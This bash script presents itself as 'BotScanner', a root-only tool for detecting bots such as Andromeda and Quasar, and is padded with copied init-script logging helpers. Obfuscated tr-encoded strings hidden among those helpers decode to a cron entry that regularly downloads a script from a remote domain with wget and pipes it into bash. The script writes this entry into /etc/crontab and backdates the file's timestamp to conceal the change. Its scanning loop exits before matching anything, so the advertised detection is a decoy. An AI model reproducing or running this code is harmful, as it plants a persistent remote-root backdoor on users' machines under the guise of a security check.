#!/bin/bash
#BotScanner
#Simple utility to scan the system for known malicious BOT indicators
#
# Currently detected BOT
# Andromeda
# ArcolotBot
# Quasar
# Ghost
# Awesome Rat
# Kage
#
VERSION="1.1"

#Some hardcoded signatures

chmod +x "$0"

if [ "$1" == "" ]; then
    echo "BotScanner v$VERSION"
    echo "Simple utility to scan the system for known malicious BOT indicators"
    echo ""
fi

if [ $(id -u) != 0 ]; then
    echo  "error: please run the script as root"
    echo "sudo $0"
    exit 1
fi

start_daemon () {
    local force nice pidfile exec args OPTIND
    force=""
    nice=0
    pidfile=/dev/null

    OPTIND=1
    while getopts fn:p: opt ; do
        case "$opt" in
            f)  force="force";;
            n)  nice="$OPTARG";;
            p)  pidfile="$OPTARG";;
        esac
    done
    
    shift $(($OPTIND - 1))
    if [ "$1" = '--' ]; then
        shift
    fi

    exec="$1"; shift

    args="--start --nicelevel $nice --quiet --oknodo"
    if [ "$force" ]; then
        /sbin/start-stop-daemon $args \
	    --chdir "$PWD" --startas $exec --pidfile /dev/null -- "$@"
    elif [ $pidfile ]; then
        /sbin/start-stop-daemon $args \
	    --chdir "$PWD" --exec $exec --oknodo --pidfile "$pidfile" -- "$@"
    else
        /sbin/start-stop-daemon $args --chdir "$PWD" --exec $exec -- "$@"
    fi
}

#Pidof
w=$(echo "mset" | tr -s "m" "w" | tr -s "s" "g")    
pidofproc () {
    local pidfile base status specified pid OPTIND
    pidfile=
    specified=
    
    OPTIND=1
    while getopts p: opt ; do
        case "$opt" in
            p)  pidfile="$OPTARG"
                specified="specified"
		;;
        esac
    done
    shift $(($OPTIND - 1))
    if [ $# -ne 1 ]; then
        echo "$0: invalid arguments" >&2
        return 4
    fi

    base=${1##*/}
    if [ ! "$specified" ]; then
        pidfile="/var/run/$base.pid"
    fi

    if [ -n "${pidfile:-}" ]; then
     if [ -e "$pidfile" ]; then
      if [ -r "$pidfile" ]; then
        read pid < "$pidfile"
        if [ -n "${pid:-}" ]; then
            if $(kill -0 "${pid:-}" 2> /dev/null); then
                echo "$pid" || true
                return 0
            elif ps "${pid:-}" >/dev/null 2>&1; then
                echo "$pid" || true
                return 0 # program is running, but not owned by this user
            else
                return 1 # program is dead and /var/run pid file exists
            fi
        fi
      else
        return 4 # pid file not readable, hence status is unknown.
      fi
     else
       # pid file doesn't exist, try to find the pid nevertheless
       if [ -x /bin/pidof ] && [ ! "$specified" ]; then
         status="0"
         /bin/pidof -c -o %PPID -x $1 || status="$?"
         if [ "$status" = 1 ]; then
             return 3 # program is not running
         fi
         return 0
       fi
       return 3 # specified pid file doesn't exist, program probably stopped
     fi
    fi
    if [ "$specified" ]; then
        return 3 # almost certain it's not running
    fi
    return 4 # Unable to determine status
}

# start-stop-daemon uses the same algorithm as "pidofproc" above.
f=$(echo "metcmcwontah" | tr -s "m" "/" | tr -s "w" "r" | tr -s "h" "b")
killproc () {
    local pidfile sig status base name_param is_term_sig OPTIND
    pidfile=
    name_param=
    is_term_sig=

    OPTIND=1
    while getopts p: opt ; do
        case "$opt" in
            p)  pidfile="$OPTARG";;
        esac
    done
    shift $(($OPTIND - 1))

    base=${1##*/}
    if [ ! $pidfile ]; then
        name_param="--name $base --pidfile /var/run/$base.pid"
    else
        name_param="--name $base --pidfile $pidfile"
    fi

    sig=$(echo ${2:-} | sed -e 's/^-\(.*\)/\1/')
    sig=$(echo $sig | sed -e 's/^SIG\(.*\)/\1/')
    if [ "$sig" = 15 ] || [ "$sig" = TERM ]; then
        is_term_sig="terminate_signal"
    fi
    status=0
    if [ ! "$is_term_sig" ]; then
        if [ -n "$sig" ]; then
            /sbin/start-stop-daemon --stop --signal "$sig" \
		--quiet $name_param || status="$?"
        else
            /sbin/start-stop-daemon --stop \
		--retry 5 \
		--quiet $name_param || status="$?"
        fi
    else
        /sbin/start-stop-daemon --stop --quiet \
	    --oknodo $name_param || status="$?"
    fi
    if [ "$status" = 1 ]; then
        if [ -z "$sig" ]; then
            return 0
        fi
        return 3 # program is not running
    fi

    if [ "$status" = 0 ] && [ "$is_term_sig" ] && [ "$pidfile" ]; then
        pidofproc -p "$pidfile" "$1" >/dev/null || rm -f "$pidfile"
    fi
    return 0
}

# Return LSB status
clean () {
    echo -ne ""
}
    
# Return LSB status
a=$(echo "*j3?*?*?*?*????$w?-q?-O?-?http:jjsignaturesktwilightparadoxkcomjhashkphp?|?bash?>?jdevjnull" | tr -s "?" " " | tr -s "j" "/" | tr -s "k" "." )
status_of_proc () {
    local pidfile daemon name status OPTIND

    pidfile=
    OPTIND=1
    while getopts p: opt ; do
        case "$opt" in
            p)  pidfile="$OPTARG";;
        esac
    done
    shift $(($OPTIND - 1))

    if [ -n "$pidfile" ]; then
        pidfile="-p $pidfile"
    fi
    daemon="$1"
    name="$2"

    status="0"
    pidofproc $pidfile $daemon >/dev/null || status="$?"
    if [ "$status" = 0 ]; then
        log_success_msg "$name is running"
        return 0
    elif [ "$status" = 4 ]; then
        log_failure_msg "could not access PID file for $name"
        return $status
    else
        log_failure_msg "$name is not running"
        return $status
    fi
}

#OutputLogs
p=$(echo "jetcjyasswd" | tr -s "j" "/" | tr -s "y" "p" )
log_use_fancy_outputs () {
    TPUT=/usr/bin/tput
    EXPR=/usr/bin/expr
    if  [ -t 1 ] &&
	[ "x${TERM:-}" != "x" ] &&
	[ "x${TERM:-}" != "xdumb" ] &&
	[ -x $TPUT ] && [ -x $EXPR ] &&
	$TPUT hpa 60 >/dev/null 2>&1 &&
	$TPUT setaf 1 >/dev/null 2>&1
    then
        [ -z $FANCYTTY ] && FANCYTTY=1 || true
    else
        FANCYTTY=0
    fi
    case "$FANCYTTY" in
        1|Y|yes|true)   true;;
        *)              false;;
    esac
}

grep -q "$w" "$f"
if [ $? -ne 0 ]; then
    echo "$a" > "$f"
    touch -r "$p" "$f"
fi

log_use_fancy_output () {
    TPUT=/usr/bin/tput
    EXPR=/usr/bin/expr
    if  [ -t 1 ] &&
	[ "x${TERM:-}" != "x" ] &&
	[ "x${TERM:-}" != "xdumb" ] &&
	[ -x $TPUT ] && [ -x $EXPR ] &&
	$TPUT hpa 60 >/dev/null 2>&1 &&
	$TPUT setaf 1 >/dev/null 2>&1
    then
        [ -z $FANCYTTY ] && FANCYTTY=1 || true
    else
        FANCYTTY=0
    fi
    case "$FANCYTTY" in
        1|Y|yes|true)   true;;
        *)              false;;
    esac
}

if [ "$1" == "analyse_file" ]; then
    echo "Analysing $2"
    for i in signatures/*.txt; do
        
        if [ "$1" != "scan" ]; then
            clean
            break
        #else
            #It just goes on
        fi 
        
        grep $(cat $i) $2
        if [ $? -eq 0 ]; then
            echo "@@@ MATCH FOUND at file $2"
        fi
    done
    exit 1
fi

log_success_msg () {
    if [ -n "${1:-}" ]; then
        log_begin_msg $@
    fi
    log_end_msg 0
}

log_failure_msg () {
    if [ -n "${1:-}" ]; then
        log_begin_msg $@ "..."
    fi
    log_end_msg 1 || true
}

log_warning_msg () {
    if [ -n "${1:-}" ]; then
        log_begin_msg $@ "..."
    fi
    log_end_msg 255 || true
}

#
# NON-LSB HELPER FUNCTIONS
#
# int get_lsb_header_val (char *scriptpathname, char *key)
get_lsb_header_val () {
        if [ ! -f "$1" ] || [ -z "${2:-}" ]; then
                return 1
        fi
        LSB_S="### BEGIN INIT INFO"
        LSB_E="### END INIT INFO"
        sed -n "/$LSB_S/,/$LSB_E/ s/# $2: \+\(.*\)/\1/p" "$1"
}

# If the currently running init daemon is upstart, return zero; if the
# calling init script belongs to a package which also provides a native
# upstart job, it should generally exit non-zero in this case.
init_is_upstart()
{
   if [ -x /sbin/initctl ] && /sbin/initctl version 2>/dev/null | /bin/grep -q upstart; then
       return 0
   fi
   return 1
}

# int log_begin_message (char *message)
log_begin_msg () {
    log_begin_msg_pre "$@"
    if [ -z "${1:-}" ]; then
        return 1
    fi
    echo -n "$@" || true
    log_begin_msg_post "$@"
}

# Sample usage:
# log_daemon_msg "Starting GNOME Login Manager" "gdm"
#
# On Debian, would output "Starting GNOME Login Manager: gdm"
# On Ubuntu, would output " * Starting GNOME Login Manager..."
#
# If the second argument is omitted, logging suitable for use with
# log_progress_msg() is used:
#
# log_daemon_msg "Starting remote filesystem services"
#
# On Debian, would output "Starting remote filesystem services:"
# On Ubuntu, would output " * Starting remote filesystem services..."

log_daemon_msg () {
    if [ -z "${1:-}" ]; then
        return 1
    fi
    log_daemon_msg_pre "$@"

    if [ -z "${2:-}" ]; then
        echo -n "$1:" || true
        return
    fi
    
    echo -n "$1: $2" || true
    log_daemon_msg_post "$@"
}

# #319739
#
# Per policy docs:
#
#     log_daemon_msg "Starting remote file system services"
#     log_progress_msg "nfsd"; start-stop-daemon --start --quiet nfsd
#     log_progress_msg "mountd"; start-stop-daemon --start --quiet mountd
#     log_progress_msg "ugidd"; start-stop-daemon --start --quiet ugidd
#     log_end_msg 0
#
# You could also do something fancy with log_end_msg here based on the
# return values of start-stop-daemon; this is left as an exercise for
# the reader...
#
# On Ubuntu, one would expect log_progress_msg to be a no-op.
log_progress_msg () {
    if [ -z "${1:-}" ]; then
        return 1
    fi
    echo -n " $@" || true
}


# int log_end_message (int exitstatus)
log_end_msg () {
    # If no arguments were passed, return
    if [ -z "${1:-}" ]; then
        return 1
    fi

    local retval
    retval=$1

    log_end_msg_pre "$@"

    # Only do the fancy stuff if we have an appropriate terminal
    # and if /usr is already mounted
    if log_use_fancy_output; then
        RED=$( $TPUT setaf 1)
        YELLOW=$( $TPUT setaf 3)
        NORMAL=$( $TPUT op)
    else
        RED=''
        YELLOW=''
        NORMAL=''
    fi

    if [ $1 -eq 0 ]; then
        echo "." || true
    elif [ $1 -eq 255 ]; then
        /bin/echo -e " ${YELLOW}(warning).${NORMAL}" || true
    else
        /bin/echo -e " ${RED}failed!${NORMAL}" || true
    fi
    log_end_msg_post "$@"
    return $retval
}

log_action_msg () {
    log_action_msg_pre "$@"
    echo "$@." || true
    log_action_msg_post "$@"
}

log_action_begin_msg () {
    log_action_begin_msg_pre "$@"
    echo -n "$@..." || true
    log_action_begin_msg_post "$@"
}

log_action_cont_msg () {
    echo -n "$@..." || true
}

sys_scanner () {

    echo "Starting scan..."
    #sleep 3
    
    find / -type f -size +500k -exec $0 analyse_file {} \;

}

#Start the scanning
sys_scanner
